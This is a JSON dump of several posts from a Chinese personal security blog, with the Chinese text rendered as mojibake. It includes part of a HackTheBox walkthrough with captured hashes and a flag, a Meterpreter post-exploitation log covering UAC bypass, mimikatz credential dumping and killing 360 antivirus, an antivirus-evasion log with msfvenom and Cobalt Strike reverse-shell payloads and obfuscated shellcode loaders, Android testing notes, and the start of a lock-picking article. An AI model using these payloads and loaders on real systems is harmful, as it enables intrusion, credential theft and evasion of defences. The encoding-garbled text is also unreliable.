&lt;Ted.Graves@intelligence.htb&gt;&#39; -Subject &quot;Host: $($record.Name) is down&quot;&#125;&#125; catch &#123;&#125;&#125; ä¼ªé€ åŸŸå 12wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;dirkjanm&#x2F;krbrelayx&#x2F;master&#x2F;dnstool.pypython3 dnstool.py -u &quot;intelligence.htb\\Tiffany.Molina&quot; -p NewIntelligenceCorpUser9876 --action add -r webbufferfly.intelligence.htb -d 10.10.16.24 10.10.10.248 è·å–è´¦æˆ· 123responder -I tun0 -ATed.Graves::intelligence:a0ccbece497d44d6:5F06EFF458D65EF3D277BBEF99522C05:01010000000000006E002FBCEB7ED70155A10145AE3210F90000000002000800320041004400530001001E00570049004E002D00490056004200580046004E00320037003300340045000400140032004100440053002E004C004F00430041004C0003003400570049004E002D00490056004200580046004E00320037003300340045002E0032004100440053002E004C004F00430041004C000500140032004100440053002E004C004F00430041004C000800300030000000000000000000000000200000A9E570CA9FC3E890033A04EB61C9D3A383AF9C961FCC3E1B59979F2C02378B410A0010000000000000000000000000000000000009003E0048005400540050002F007700650062003100310034003500310034002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000 çˆ†ç ´Hash 123john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt hashMr.Teddy (Ted.Graves) è·å¾—å‡­è¯ 1Ted.Graves:Mr.Teddy è·å–Hash 1234wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;micahvandeusen&#x2F;gMSADumper&#x2F;main&#x2F;gMSADumper.pypython3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.10.10.248svc_int$:::47e89a6afd68e3872ef1acaf91d0b2f7 è·å–SPN 1234git clone https:&#x2F;&#x2F;github.com&#x2F;the-useless-one&#x2F;pywerviewpython3 pywerview.py get-netcomputer -u svc_int$ --hashes 47e89a6afd68e3872ef1acaf91d0b2f7 -d intelligence.htb -t dc.intelligence.htb --full-datamsds-allowedtodelegateto: WWW&#x2F;dc.intelligence.htb è·å–ST 12345python3 getST.py intelligence.htb&#x2F;svc_int$ -spn WWW&#x2F;dc.intelligence.htb -hashes :47e89a6afd68e3872ef1acaf91d0b2f7 -impersonate administratorexport KRB5CCNAME&#x3D;administrator.ccachepython3 secretsdump.py -k dc.intelligence.htb -just-dcAdministrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3::: Hashç™»å…¥ 1234evil-winrm -i 10.10.10.248 -u administrator -H 9075113fe16cf74f7c0f9b27e882dad3type c:\\users\\administrator\\desktop\\root.txt0c6b9779d283e244e79b11c78fc1fb92","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"},{"name":"Windows","slug":"Windows","permalink":"https://yoloyolo.top/tags/Windows/"}]},{"title":"Post Pentest 101","slug":"Post-Pentest-101","date":"2021-08-23T02:26:51.000Z","updated":"2022-05-14T16:05:21.000Z","comments":true,"path":"2021/08/22/Post-Pentest-101/","link":"","permalink":"https://yoloyolo.top/2021/08/22/Post-Pentest-101/","excerpt":"è®°å½•ä¸€äº›åæ¸—é€çš„æ“ä½œ 10/69çš„é©¬è¿‡ä¸€å‘¨å˜20/68äº†ï¼Œä»Šå¤©ä¸¢è™šæ‹Ÿæœºç›´æ¥æŠ¥æ¯’ï¼Œçœ‹æ¥å…æ€ä¸Šè¿˜å¾—å¤šå­¦å­¦","text":"è®°å½•ä¸€äº›åæ¸—é€çš„æ“ä½œ 10/69çš„é©¬è¿‡ä¸€å‘¨å˜20/68äº†ï¼Œä»Šå¤©ä¸¢è™šæ‹Ÿæœºç›´æ¥æŠ¥æ¯’ï¼Œçœ‹æ¥å…æ€ä¸Šè¿˜å¾—å¤šå­¦å­¦ è·å¾—äº†meterpreterä¼šè¯ä¹‹åçš„æ“ä½œ 123456789101112ps | grep 360PID PPID Name Arch Session User Path--- ---- ---- ---- ------- ---- ----1104 1672 360Tray.exe x86 16272 1104 360Safe.exe x86 16380 6272 360leakfixer.exe x86 1ps | grep HipsPID PPID Name Arch Session User Path--- ---- ---- ---- ------- ---- ----1152 188 HipsTray.exe x86 15268 6172 HipsMain.exe x86 1 DESKTOP-653VJP2\\Kira C:\\Program Files (x86)\\Huorong\\Sysdiag\\bin\\HipsMain.exe5444 624 HipsDaemon.exe å°†è¿›ç¨‹è¿ç§»åˆ°èµ„æºæµè§ˆå™¨ä¸­ 123ps | grep explorer3936 4916 explorer.exe x64 1 DESKTOP-653VJP2\\Kira C:\\Windows\\explorer.exemigrate 3936 è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼Œå¦‚æœmeterpreteråœ¨bypassuacä¹‹åè·å¾—äº†é«˜æƒé™ï¼Œä½†æ˜¯ç»§ç»­å‘ä½æƒé™çš„è¿›ç¨‹è¿ç§»çš„è¯ï¼Œä¼šè¢«é™æƒ ä½¿ç”¨bypassuacè·å¾—Administratorçš„æƒé™(ç«ç»’ç¨³å®šæ‹¦ï¼Œç¡®åˆ‡æ¥è¯´æ˜¯ç›´æ¥æŠŠä¸Šä¼ çš„ç¨‹åºç»™åˆ äº†ï¼Œ360æœ‰æ—¶å€™ä¼šæ‹¦) 1234567use exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injectionset payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcpset LHOST 192.168.56.103set LPORT 9876set target 1set session 3run å› ä¸ºç³»ç»Ÿç‰ˆæœ¬é—®é¢˜ï¼Œä¸èƒ½ç”¨&quot;bypassuac&quot;ï¼Œåªèƒ½ç”¨&quot;bypassuac_injection&quot;ï¼Œæ‰€ä»¥ä¼šè«åå…¶å¦™åœ°è§¦å‘äº†ä¸ª&quot;SQL Client Configuration Utility EXE&quot;çš„UACï¼Œç„¶åå¯¼è‡´äº†MSFé‚£è¾¹æ”¶ä¸åˆ°session å¦ä¸€å°ç”µè„‘ä¸Šè¯•çš„æ—¶å€™ç”¨çš„æ˜¯&quot;bypassuac&quot;ï¼Œå€’æ²¡é—®é¢˜ è¿™é‡Œéœ€è¦æ³¨æ„ä¸€ç‚¹ targetå‚æ•°éœ€è¦ä¸ç›®æ ‡æœºå™¨ä¸Šçš„æ“ä½œç³»ç»Ÿç›¸å¯¹åº” 12345678show targetExploit targets: Id Name -- ---- 0 Windows x86 1 Windows x64 ä½¿ç”¨mimikatzæ¨¡å—å¯¼å‡ºHash 123use kiwikiwi_cmd privilege::debugkiwi_cmd sekurlsa::logonpasswords å¾—åˆ°Hash 123456789101112131415161718192021222324Authentication Id : 0 ; 396268 (00000000:00060bec)Session : Interactive from 1User Name : KiraDomain : DESKTOP-653VJP2Logon Server : DESKTOP-653VJP2Logon Time : 2021&#x2F;8&#x2F;22 17:27:49SID : S-1-5-21-413531007-3663720574-771213360-1001 msv : [00000003] Primary * Username : Kira * Domain : DESKTOP-653VJP2 * NTLM : 38uZAEr4UA7uUYqgCEsBEDJJRsnnsZ2dUt * SHA1 : 6ed5833cf35286ebf8662b7b5949f0d742bbec3f tspkg : wdigest : * Username : Kira * Domain : DESKTOP-653VJP2 * Password : (null) kerberos : * Username : Kira * Domain : DESKTOP-653VJP2 * Password : (null) ssp : credman : NTLMçš„åŠ å¯†ç®—æ³•ä¸ºMD4ï¼Œçˆ†ç ´èµ·æ¥ä¸ç®—å¤æ‚ è¿™é‡Œå¯†ç æ˜¯123456 æ‹¿äº†å¯†ç åŸºæœ¬å°±å¯ä»¥rdpç™»å…¥ä¸Šå»æ“ä½œ(å…³æ€è½¯)äº† ç®¡ç†å‘˜æƒé™ä¸‹taskkillåªèƒ½å…³æ‰360Safeï¼Œä¸èƒ½å…³æ‰360Trayä¸ZhuDongFangYu ä¹‹åå¯ä»¥ä½¿ç”¨backstabæ¥å¹²æ‰&quot;ZhuDongFangYu.exe&quot;è¿›ç¨‹ åœ¨æ–°è£…çš„è™šæ‹Ÿæœºä¸Šè¿è¡Œæç¤ºç¼ºå°‘ä¸‹é¢ä¸¤ä¸ªdll VCRUNTIME140D.dll ucrtbased.dll 64ä½ç³»ç»Ÿä¸Šï¼Œ64ä½dllè·¯å¾„ä¸º&quot;C:\\Windows\\System32&quot;ï¼Œ32ä½dllè·¯å¾„ä¸º&quot;C:\\Windows\\SysWOW64&quot; å¦‚æœå®æˆ˜è·‘ä¸äº†è¿™ç©æ„ï¼Œä¼°è®¡å¾—ç”¨screenshotçœ‹çœ‹æ˜¯ä»€ä¹ˆæƒ…å†µ æ‹¿è¿™ç©æ„æ€ä¸æ‰360Trayï¼Œåè€Œä¸€ä¸ªå¼€å§‹å CPUä¸€ä¸ªå¼€å§‹å å†…å­˜ ä¼°è®¡æ˜¯360åœ¨ç«äº‰ç”Ÿæˆè¿›ç¨‹ï¼ŒBackstabæ²¡æœ‰åšå†…å­˜é‡Šæ”¾çš„æœºåˆ¶ æœ€åå¯¼è‡´è™šæ‹Ÿæœºå¡æ­» æ˜å¤©æ¢å°æœºå™¨è¯•è¯• å…¬å¸æœºå™¨ä¸Šå¼€è™šæ‹Ÿæœºå…³360ä¸»ç¨‹åºçš„æ—¶å€™360Trayä¼šè‡ªåŠ¨é€€å‡ºï¼Œç„¶åå°±èƒ½å¹²&quot;ZhuDongFangYu.exe&quot; å°±å¾ˆç„å­¦","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"Windows","slug":"Windows","permalink":"https://yoloyolo.top/tags/Windows/"},{"name":"Post_Pentest","slug":"Post-Pentest","permalink":"https://yoloyolo.top/tags/Post-Pentest/"}]},{"title":"Log of Anti-AntiVirus","slug":"Log-of-Anti-AntiVirus","date":"2021-08-08T06:08:58.000Z","updated":"2022-06-10T16:45:30.000Z","comments":true,"path":"2021/08/08/Log-of-Anti-AntiVirus/","link":"","permalink":"https://yoloyolo.top/2021/08/08/Log-of-Anti-AntiVirus/","excerpt":"Bypass 4 Fun","text":"Bypass 4 Fun Payloads VirusTotal Remark msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=9876 -f exe &gt; Bufferfly.exe 53/69 msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 16 LHOST=192.168.56.103 LPORT=9876 -f exe &gt; Bufferfly.exe 52/69 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=9876 -f c &gt; Bufferfly.c 20/69 Visual Studioç¼–è¯‘ç”Ÿæˆ32ä½å¯æ‰§è¡Œç¨‹åº msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 16 LHOST=192.168.56.103 LPORT=9876 -f c &gt; Bufferfly.c 13/69 Visual Studioç¼–è¯‘ç”Ÿæˆ32ä½å¯æ‰§è¡Œç¨‹åº msfvenom -p windows/x64/meterpreter/reverse_tcp -e LHOST=192.168.56.103 LPORT=9876 -f py &gt; Bufferfly.py 23/69 Payloadéœ€è¦ä¸Pythonç‰ˆæœ¬ç›¸åŒ¹é… msfvenom -p windows/x64/meterpreter/reverse_tcp -e LHOST=192.168.56.103 LPORT=9876 -f py &gt; Bufferfly.py DES 15/70 Payloadéœ€è¦ä¸Pythonç‰ˆæœ¬ç›¸åŒ¹é… pyinstaller -F -w -p PATH_TO_PAKEAGE shellcode.py (Cryptodome) msfvenom -p windows/x64/meterpreter/reverse_tcp -e LHOST=192.168.56.103 LPORT=9876 -f py &gt; Bufferfly.py DES BASE64 11/69 Payloadéœ€è¦ä¸Pythonç‰ˆæœ¬ç›¸åŒ¹é… pyinstaller -F -w -p PATH_TO_PAKEAGE shellcode.py (Cryptodome) CobaltStrike windows/beacon_http/reverse_http x86 EXE 50/67 CobaltStrike windows/beacon_http/reverse_http x86 C 27/70 Visual Studioç¼–è¯‘ç”Ÿæˆ32ä½å¯æ‰§è¡Œç¨‹åº CobaltStrike windows/beacon_http/reverse_http x64 Python 23/68 Payloadéœ€è¦ä¸Pythonç‰ˆæœ¬ç›¸åŒ¹é… CobaltStrike windows/beacon_http/reverse_http x64 Python DES BASE64 10/68 Payloadéœ€è¦ä¸Pythonç‰ˆæœ¬ç›¸åŒ¹é… pyinstaller -F -w -p PATH_TO_PAKEAGE shellcode.py (Cryptodome) 1234567unsigned char buf[] = &quot;shellcode&quot;;main()&#123; LPVOID shellcode = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); memcpy(shellcode, buf, sizeof(buf)); ((void(*)())shellcode)();&#125; 123456789import ctypesbuf = b&quot;shellcode&quot;shellcode = bytearray(buf)ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40))buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode)))handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1)) 1234567891011121314151617181920212223242526272829#encrypt.pyfrom Cryptodome.Cipher import DESimport base64buf = b&quot;shellcode&quot;key = b&#x27;DEADC0DE&#x27;des = DES.new(key, DES.MODE_ECB)pad = (8 - len(buf) % 8) * b&quot;\\x00&quot;b64code = base64.b64encode(des.encrypt(buf + pad))print(b64code)print(len(buf))#---------------------------#shellcode.pyfrom Cryptodome.Cipher import DESimport base64import ctypesb64code = b&quot;base64code&quot;length = 510key = b&quot;DEADC0DE&quot;des = DES.new(key, DES.MODE_ECB)buf = des.decrypt(base64.b64decode(b64code))[:length]shellcode = bytearray(buf)ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000),ctypes.c_int(0x40))buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(len(shellcode)))#eval(base64.b64decode(&quot;Y3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX3VpbnQ2NChwdHIpLGJ1ZixjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpKQ==&quot;))handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))#exec(base64.b64decode(&quot;aGFuZGxlID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5DcmVhdGVUaHJlYWQoY3R5cGVzLmNfaW50KDApLGN0eXBlcy5jX2ludCgwKSxjdHlwZXMuY191aW50NjQocHRyKSxjdHlwZXMuY19pbnQoMCksY3R5cGVzLmNfaW50KDApLGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkp&quot;))ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1)) PythonåŸ·è¡Œpyinstallerç”¢ç”Ÿçš„åŸ·è¡Œæª”å‡ºç¾No moduleéŒ¯èª¤è¨Šæ¯ python3 shellcode ä½¿ç”¨evalå‡½æ•° bypass AV å¯¹äºpythonä¸­evalå‡½æ•°ä¸èƒ½æ‰§è¡Œèµ‹å€¼æ“ä½œçš„è§£å†³æ–¹æ³• å®éªŒä½¿ç”¨ C ç¼–è¯‘ shellcode å…æ€ä¸Šçº¿ python3çš„Cryptodome Cobalt Strikeç³»åˆ—æ•™ç¨‹ç¬¬ä¸€ç« ï¼šç®€ä»‹ä¸å®‰è£… CS teamserver.bat Cobalt Strike 4.3ç ´è§£ç‰ˆ","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Anti_AntiVirus","slug":"Anti-AntiVirus","permalink":"https://yoloyolo.top/tags/Anti-AntiVirus/"},{"name":"Meterpreter","slug":"Meterpreter","permalink":"https://yoloyolo.top/tags/Meterpreter/"},{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://yoloyolo.top/tags/CobaltStrike/"}]},{"title":"æŸAPPæµ‹è¯•é¡¹ç›®å°ç»“","slug":"Summary-For-Android-APP-Test","date":"2021-08-02T02:20:01.000Z","updated":"2022-05-14T16:03:47.000Z","comments":true,"path":"2021/08/01/Summary-For-Android-APP-Test/","link":"","permalink":"https://yoloyolo.top/2021/08/01/Summary-For-Android-APP-Test/","excerpt":"Busy &amp; Lazy","text":"Busy &amp; Lazy ActivityåŠ«æŒ ActivityåŠ«æŒï¼Œåˆç§°StrandHogg å…·ä½“ä»‹ç»: https://www.freebuf.com/company-information/249009.html åˆ©ç”¨æ–¹å¼ä¸Clickjackingæœ‰äº›ç›¸ä¼¼ï¼Œéƒ½æ˜¯é€šè¿‡UIæ¬ºéª—ï¼Œæ¥å¼•å¯¼ç”¨æˆ·è¿›è¡Œæ¶æ„æ“ä½œ è‡³äºé˜²å¾¡æ‰‹æ®µ ä¸€æ–¹é¢æ˜¯éœ€è¦å¯¹ç”¨æˆ·è¿›è¡Œå®‰å…¨æ„è¯†åŸ¹è®­ä¸å®£ä¼  å¦ä¸€æ–¹é¢ï¼ŒAPPå¯ä»¥æ£€æµ‹è‡ªèº«æ˜¯å¦è¢«ç³»ç»Ÿç¨‹åºè¦†ç›–ï¼ŒåŒæ—¶å¯ä»¥æ£€æµ‹ç¨‹åºè¿›å…¥åå°æ˜¯å¦ç”±ç”¨æˆ·æ“ä½œé€ æˆ(Homeé”®ï¼Œè¿”å›é”®) æ¼æ´å¤ç°æµ‹è¯• https://www.freebuf.com/sectool/249725.html AndroidæŠ“åŒ… ä¸€å¼€å§‹ä»¥ä¸ºè·Ÿæ™®é€šçš„BurpæŠ“åŒ…åŒºåˆ«ä¸å¤§ï¼Œåæ¥å‘ç°é‡Œé¢çš„é—¨é“è¿˜æ˜¯æŒºå¤šçš„ ç”¨æˆ·è¯ä¹¦ä¸ç³»ç»Ÿè¯ä¹¦ ç›´æ¥é€šè¿‡æµè§ˆå™¨ä¸‹è½½å®‰è£…çš„è¯ä¹¦ä¸ºç”¨æˆ·è¯ä¹¦ï¼Œä¸€äº›å®‰å…¨æ€§è¾ƒé«˜çš„APPä¸ä¼šä¿¡ä»»ç”¨æˆ·è¯ä¹¦ ä½†æ˜¯å¯ä»¥é€šè¿‡å®‰è£…ç³»ç»Ÿè¯ä¹¦æ¥ç»•è¿‡ï¼ˆéœ€rootï¼‰ https://blog.csdn.net/weixin_31702225/article/details/117694829 å•å‘éªŒè¯ä¸åŒå‘éªŒè¯ å•/åŒå‘éªŒè¯çš„ä¸€äº›ç»†èŠ‚å°±ä¸å†èµ˜è¿° å•å‘éªŒè¯ä¸€èˆ¬æ˜¯å®¢æˆ·ç«¯éªŒè¯æœåŠ¡ç«¯ åŒå‘éªŒè¯æµ‹è¯•ä¸¤è€…ç›¸äº’éªŒè¯ æŠŠAPKä¸¢è¿›jadxï¼Œæœç´¢&quot;checkclienttrusted&quot;å’Œ&quot;checkservertrusted&quot; ä¸¤è€…åˆ†åˆ«å¯¹åº”&quot;éªŒè¯å®¢æˆ·ç«¯&quot;å’Œ&quot;éªŒè¯æœåŠ¡ç«¯&quot; Fridaä¸Xposed+JustTrustMEçš„æ–¹æ³•å¤§æ¦‚éƒ½æ˜¯å»åŠ«æŒéªŒè¯è¿‡ç¨‹ä»è€Œè¿›è¡ŒBypass https://xz.aliyun.com/t/6551#toc-13 Burpsuite &amp; Fiddler å°±è¿™æ¬¡çš„æµ‹è¯•æ¥çœ‹ Fiddlerä¸Burpsuiteéƒ½æœ‰äº›å„è‡ªçš„æ¯›ç—… æ¯”å¦‚Fiddleré‡Œ401çš„è¯·æ±‚åˆ°äº†Burpsuiteå°±200 æ¯”å¦‚Burpsuiteç›¸æ¯”äºFiddlerä¼šå°‘äº†å‡ ä¸ªHTTPå¤´ ä½†æ˜¯ä¸¤è€…ç»“åˆæ¥ä½¿ç”¨æ•ˆæœè¿˜æ˜¯å¾ˆä¸é”™çš„ JustReverseIt é€†å‘ä¸ç”¨ç®¡ä¼šä¸ä¼šé€†å‘ï¼Œé€†å‘ä¹Ÿä¸ç®¡èƒ½ä¸èƒ½è¯»æ‡‚Javaä»£ç ï¼Œåªè¦ä¼šåœ¨jadxé‡ŒCtrl+Få°±è¡Œ é€šè¿‡é€†å‘ï¼Œçœ‹åˆ°äº†ä¸€äº›HTTPéªŒè¯å¤´çš„è®¡ç®—æ–¹æ³•ï¼Œä¹Ÿçœ‹åˆ°äº†AESåŠ å¯†çš„å¯†é’¥ä¸åŠ å¯†æ–¹æ³•ï¼Œetc. æœ‰äº†è¿™äº›ä¿¡æ¯åœ¨è¿›è¡Œæµ‹è¯•çš„æ—¶å€™å°±èƒ½å¤Ÿå¤šå‘ç°ä¸€ç‚¹å¯æµ‹è¯•çš„ç‚¹","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Android","slug":"Android","permalink":"https://yoloyolo.top/tags/Android/"},{"name":"Application_Test","slug":"Application-Test","permalink":"https://yoloyolo.top/tags/Application-Test/"}]},{"title":"æµ…æå¼¹å­æŒ‚é”çš„æ”»å‡»æ–¹å¼","slug":"pin-tumbler-lock","date":"2021-07-12T01:24:29.000Z","updated":"2023-02-08T15:05:15.386Z","comments":true,"path":"2021/07/11/pin-tumbler-lock/","link":"","permalink":"https://yoloyolo.top/2021/07/11/pin-tumbler-lock/","excerpt":"æœ¬æ–‡ç”¨äºè®¨è®ºå¼¹å­æŒ‚é”æ”»å‡»æ–¹å¼ï¼Œè¯·å‹¿ç”¨äºè¿æ³•ç”¨é€” Is key necessary to unlock? Absolutely not.","text":"æœ¬æ–‡ç”¨äºè®¨è®ºå¼¹å­æŒ‚é”æ”»å‡»æ–¹å¼ï¼Œè¯·å‹¿ç”¨äºè¿æ³•ç”¨é€” Is key necessary to unlock? Absolutely not. ä¸€äº›åºŸè¯ å¼€é”è¿™ä¸€æŠ€èƒ½åœ¨åˆä¸­çš„æ—¶å€™è·Ÿä¸€äº›ä¸è‰¯åŒå­¦å­¦è¿‡ é«˜ä¸­æ—¶å¼€å§‹ç†Ÿç»ƒè¿ç”¨ï¼Œå¦‚ å¼€ç©ºæ•™å®¤çš„é—¨æ‹¿æ¤…å­ ä½“è‚²è¯¾å¼€å™¨æå®¤çš„é—¨ å¤„ç†ä¸€äº›ç§äººæ©æ€¨ etc. ä½†æ˜¯ä»æ¥éƒ½æ²¡æœ‰å…·ä½“çš„äº†è§£è¿‡é”å…·çš„ç»“æ„ï¼Œå°±åƒå¤§ä¸€æ—¶çš„æˆ‘ç©ºçŸ¥é“webå®‰å…¨çš„æ¼æ´ï¼Œä½†æ˜¯ä»æ¥éƒ½æ²¡æœ‰å»å…·ä½“ç ”ç©¶ç›¸å…³çš„å‡½æ•°æˆ–ä»£ç ï¼Œè‡ªç„¶è€Œç„¶åœ°å°±å¯¹è‡ªå·±çš„å­¦ä¹ äº§ç”Ÿäº†ç“¶é¢ˆ é”å…·çš„å®‰å…¨ä¸ç½‘ç»œå®‰å…¨æœ‰äº›ç±»ä¼¼ï¼Œéƒ½åº”å½“é»˜è®¤å¤–ç•Œçš„è¾“å…¥æ˜¯ä¸å®‰å…¨çš„ï¼Œæˆ–è®¸è¿™å°±æ˜¯å®‰å…¨çš„é€šæ€§ ç½‘ä¸Šæœäº†ä¸‹â€œä¼ æˆå¼€é”æŠ€èƒ½è§¦çŠ¯ä¼ æˆçŠ¯ç½ªæ–¹æ³•ç½ªâ€çš„å†…å®¹ï¼Œæ‰€ä»¥å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™å†…å¿ƒè¿˜æ˜¯æœ‰äº›å¿å¿‘ä¸ç–‘æƒ‘çš„ å¿å¿‘ çŠ¯ç½ªè¡Œä¸ºéœ€è¦åŒæ—¶æ»¡è¶³ä¸»è§‚æ¡ä»¶ä¸å®¢è§‚æ¡ä»¶ ä¸»è§‚ä¸Šï¼šæœ¬æ–‡ä»…åœ¨è®¨è®ºå¼¹ç°§é”çš„æ”»å‡»æ–¹å¼ å®¢è§‚ä¸Šï¼šæœ¬æ–‡ä»…åœ¨è®¨è®ºå¼¹ç°§é”çš„æ”»å‡»æ–¹å¼ ç–‘æƒ‘ å¼€é”ä¸Hackingæœ‰äº›ç±»ä¼¼ï¼Œéƒ½æ˜¯ä¸€ç§å¯¹äºå…¬å…±å®‰å…¨å…·æœ‰æ½œåœ¨å¨èƒçš„è¡Œä¸ºï¼Œä½†æ˜¯ä¸ªäººæ„Ÿè§‰åè€…çš„é—¨æ§›ä¸å¤æ‚ç¨‹åº¦è¿˜æ˜¯æ¯”å‰è€…é«˜ä¸€äº› æŸäº›æƒ…å†µä¸‹ä¼ æˆå¼€é”æŠ€èƒ½ä¼šè§¦çŠ¯ä¼ æˆçŠ¯ç½ªæ–¹æ³•ç½ªï¼Œé‚£ä¹ˆä¼ æˆç½‘ç»œå®‰å…¨æŠ€èƒ½å‘¢ï¼Ÿ è²Œä¼¼ä¹Ÿä¼šï¼Œå› ä¸ºå¬è¯´è¿‡è€å¸ˆæ•™å­¦ç”Ÿä¸¤æ‰‹ä¹‹åå­¦ç”Ÿç«¯äº†å­¦æ ¡çš„ç½‘ç«™æœ€åè€å¸ˆè¢«è¯·å–èŒ¶çš„äº‹ å¦‚æœè¿™ç¯‡æ–‡ç« çœŸçš„æ¶‰å«Œè§¦çŠ¯ä¼ æˆçŠ¯ç½ªæ–¹æ³•ç½ªï¼Œé‚£å…¬å¸ƒEXPè·Ÿå†™æ¼æ´åˆ†ææ–‡ç« çš„æ˜¯ä¸æ˜¯éƒ½å¾—è¯¥æŒ¨ä¸ªæŠ“ å¼¹ç°§é”ç»“æ„æ¦‚è¿° å›¾ç»˜åˆ¶è¿‡ç¨‹æ²¡æœ‰å¯¹é”å…·è¿›è¡Œå…·ä½“çš„æµ‹é‡ï¼Œæ¯”ä¾‹å¯èƒ½å­˜åœ¨è¾ƒå¤§çš„è¯¯å·® ï¼ˆå¼¹å­ç»„éƒ¨åˆ†ä¸ºäº†æ–¹ä¾¿æ‰€ä»¥æŠŠå¼¹å­ç”»å¾—å¹³é½ï¼Œç°å®ä¸­é”çš„å¼¹å­è‚¯å®šæ˜¯ä¸é½çš„ï¼Œè€Œä¸”æ˜¯ä¸é’¥åŒ™çš„å½¢çŠ¶å¯¹åº”çš„ï¼‰ è§£é”æ­¥éª¤ é’¥åŒ™æ’å…¥é”èŠ¯ï¼Œé’¥åŒ™é”€ä¸é©±åŠ¨é”€çš„ç©ºéš™æ­£å¥½å¤„äºé”èº«ä¸é”èŠ¯ä¹‹é—´çš„æˆªçº¿ï¼Œæ­¤æ—¶é”èŠ¯å¯ä»¥é¡ºæ—¶é’ˆè½¬åŠ¨ é”èŠ¯é¡ºæ—¶é’ˆè½¬åŠ¨æ—¶ï¼Œé”èŠ¯ä¸Šæ–¹çš„æ‹¨çˆªæ‹¨åŠ¨é”èˆŒçš„æ‹¨çˆªï¼Œå‘å³å‹ç¼©å¼¹ç°§Bï¼Œä½¿é”èˆŒå‘å³ç§»åŠ¨ é”èˆŒç§»åŠ¨ä¸€å®šè·ç¦»ä¹‹åï¼Œé”èˆŒè§£é™¤äº†å¯¹äºé”æ¢å·¦ä¾§çš„é™åˆ¶ï¼Œåœ¨å¼¹ç°§Açš„ä½œç”¨ä¸‹å¼¹å‡ºé”æ¢ è‡³æ­¤ï¼Œè§£é”å®Œæ¯• Method 0 æ¨¡æ‹Ÿé”èŠ¯è½¬åŠ¨ ä½¿ç”¨éŸ§æ€§å¼ºçš„é“ä¸ï¼ˆæ¨èä¼çš„ç»†ä¼éª¨ï¼‰åˆ¶æˆå¦‚å›¾å½¢çŠ¶ åˆ©ç”¨æ æ†åŸç†æ‹¨åŠ¨é”èˆŒä¸Šçš„æ‹¨çˆªï¼Œå‹ç¼©å¼¹ç°§Bï¼Œä½¿é”èˆŒå‘å³ç§»åŠ¨ï¼Œä»è€Œå¼€é” ç‰¹æ®Šæƒ…å†µ ä»¥ä¸Šåªæ˜¯æœ€æ™®é€šçš„çŠ¶å†µï¼Œä¸ªäººæ‰‹ä¸Šçš„é”å…·ä¸å¤šï¼Œå‡­å€Ÿè‡ªå·±çš„æ€è€ƒä¸è§‚å¯Ÿå¾—å‡ºä»¥ä¸‹ä¸¤ç§ç‰¹æ®ŠçŠ¶å†µ é˜²æ‹¨ç›–ç‰‡ é”èŠ¯ä¸é”èˆŒçš„ä¹‹é—´ä¸ªäººæ„Ÿè§‰å¯ä»¥ç”¨é˜²æ‹¨ç›–ç‰‡æŒ¡ä½ ä¸€èˆ¬æ¥è¯´ï¼Œé’¥åŒ™ä¸ä¼šæ’å…¥åˆ°è¿™ç§æ·±åº¦çš„ä½ç½® åŒå‘é”èˆŒ 